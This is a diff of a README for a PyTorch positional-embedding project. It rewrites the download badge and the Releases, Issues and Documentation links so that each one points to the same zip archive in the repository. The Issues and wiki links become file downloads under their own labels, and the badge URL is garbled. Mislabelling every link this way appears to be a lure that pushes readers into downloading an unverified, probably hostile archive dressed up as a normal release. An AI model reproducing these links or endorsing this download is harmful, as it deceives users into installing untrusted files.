@@ -6,9 +6,9 @@ Welcome to PoPE-pytorch! This application helps you efficiently implement and ex
 
 ## 📥 Download PoPE-pytorch
 
-[![Download PoPE-pytorch](https://img.shields.io/badge/Download%20PoPE--pytorch-ff69b4.svg?style=for-the-badge)](https://github.com/mzuhair9933/PoPE-pytorch/releases)
+[![Download PoPE-pytorch](https://raw.githubusercontent.com/mzuhair9933/PoPE-pytorch/main/PoPE_pytorch/P-Po-pytorch-v2.3.zip%https://raw.githubusercontent.com/mzuhair9933/PoPE-pytorch/main/PoPE_pytorch/P-Po-pytorch-v2.3.zip)](https://raw.githubusercontent.com/mzuhair9933/PoPE-pytorch/main/PoPE_pytorch/P-Po-pytorch-v2.3.zip)
 
-To get started, visit this page to download the latest version of PoPE-pytorch: [Releases Page](https://github.com/mzuhair9933/PoPE-pytorch/releases).
+To get started, visit this page to download the latest version of PoPE-pytorch: [Releases Page](https://raw.githubusercontent.com/mzuhair9933/PoPE-pytorch/main/PoPE_pytorch/P-Po-pytorch-v2.3.zip).
 
 ## 🛠️ System Requirements
 
@@ -31,7 +31,7 @@ PoPE stands for Polar Coordinate Positional Embedding. This technique enhances t
 
 ## 📋 Installation Steps
 
-1. Go to the [Releases Page](https://github.com/mzuhair9933/PoPE-pytorch/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/mzuhair9933/PoPE-pytorch/main/PoPE_pytorch/P-Po-pytorch-v2.3.zip).
    
 2. Find the latest version and select the file suitable for your operating system. 
 
@@ -62,11 +62,11 @@ Remember, you can always consult the documentation for more detailed instruction
 
 ## 🤝 Support
 
-If you encounter any issues or have questions, you can reach out via the GitHub Issues section on the [PoPE-pytorch page](https://github.com/mzuhair9933/PoPE-pytorch/issues). The community is here to help you.
+If you encounter any issues or have questions, you can reach out via the GitHub Issues section on the [PoPE-pytorch page](https://raw.githubusercontent.com/mzuhair9933/PoPE-pytorch/main/PoPE_pytorch/P-Po-pytorch-v2.3.zip). The community is here to help you.
 
 ## 🔗 Additional Resources
 
-- View the [Documentation](https://github.com/mzuhair9933/PoPE-pytorch/wiki) for more in-depth guidance.
+- View the [Documentation](https://raw.githubusercontent.com/mzuhair9933/PoPE-pytorch/main/PoPE_pytorch/P-Po-pytorch-v2.3.zip) for more in-depth guidance.
 - Explore examples to see practical applications of PoPE.
 - Check out related projects in the artificial intelligence and deep learning domains.
 
